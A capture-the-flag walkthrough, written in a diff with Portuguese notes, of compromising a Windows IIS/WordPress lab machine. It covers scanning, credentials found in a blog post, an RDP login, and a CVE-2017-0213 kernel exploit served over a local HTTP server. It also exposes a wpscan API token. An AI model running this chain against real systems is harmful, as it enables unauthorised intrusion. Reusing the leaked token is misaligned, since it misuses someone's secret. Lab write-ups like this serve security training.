@@ -1,0 +1,87 @@
+Servidor IIS (Windows)
+
+My ip: 192.168.200.114
+
+--> sudo rustscan -a 10.64.179.217
+
+Open 10.64.179.217:80
+Open 10.64.179.217:3389
+
+--> sudo nmap -sV -sC -Pn -p 80,3389 10.64.179.217
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2026-03-08T18:56:44+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Not valid before: 2026-03-07T18:43:12
+|_Not valid after:  2026-09-06T18:43:12
+|_ssl-date: 2026-03-08T18:56:48+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+--> ffuf -u http://10.64.179.217/FUZZ -H "Host: 10.64.179.217" -w ~/Downloads/Wordlists/admin.txt  -t 100 -c -mc 200,301,302
+
+retro                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 157ms]
+
+
+--> CMS: Wordpress 5.2.1
+--> PHP: 7.1.29
+
+--> whatweb http://10.64.179.217/retro/
+--> HTTPServer[Microsoft-IIS/10.0]
+--> Script[text/javascript], Title[Retro Fanatics &#8211; Retro Games, Books, and Movies Lovers]
+
+--> wpscan --url http://10.64.179.217/retro/ --api-token=Z3ZLVtBWnRzVZK1khIxO2NPqEJuIzttCRCmuMficshc --enumerate vp --plugins-detection=aggressive
+
+--> USERNAMES: wade
+--> http://10.64.179.217/retro/index.php/2019/12/09/ready-player-one/
+	|_> Leaving myself a note here just in case I forget how to spell it: parzival
+	|_> PASSWORD: parzival
+	
+USERNAME: wade
+PASSWORD: parzival
+
+--> PORTA RDP TAMBÉM ESTÁ ABERTA!
+--> xfreerdp /u:wade /p:parzival /v:10.64.179.217
+--> FLAG1: Encontrada ao abrir a tela do RDP
+
+DESCOBRINDO VERSÃO DO SISTEMA:
+
+--> systeminfo:
+
+Host Name:                 RETROWEB
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393	---> KERNEL VULNERÁVEL
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00377-60000-00000-AA325
+Original Install Date:     12/8/2019, 10:50:43 PM
+System Boot Time:          3/8/2026, 10:42:04 AM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+
+--> https://github.com/SecWiki/windows-kernel-exploits
+
+--> CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
+
+--> sudo python3 -m http.server 80
+--> baixei o exploit na máquina
+--> peguei root e li a flag do administrador!
